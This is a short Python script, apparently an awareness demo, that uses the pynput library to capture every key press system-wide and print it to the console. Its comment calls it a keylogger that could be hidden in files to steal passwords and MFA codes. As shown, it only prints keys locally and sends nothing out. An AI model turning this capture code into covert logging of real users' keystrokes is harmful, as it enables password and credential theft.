# Simple example of a keylogger that uses to listen to the OS key event and logs them
# to console. This could be hidden in any file? Hopefully, your end point protection
# discovers it. It shows that a simple application is able to steal your passwords from
# all sources, like websites and applications. Even (if they are fast) use a MFA token.

from pynput.keyboard import Key, Listener

def on_press(key):
    print(key)
    if key == Key.esc:
        return False

with Listener(on_press=on_press) as listener:
    listener.join()
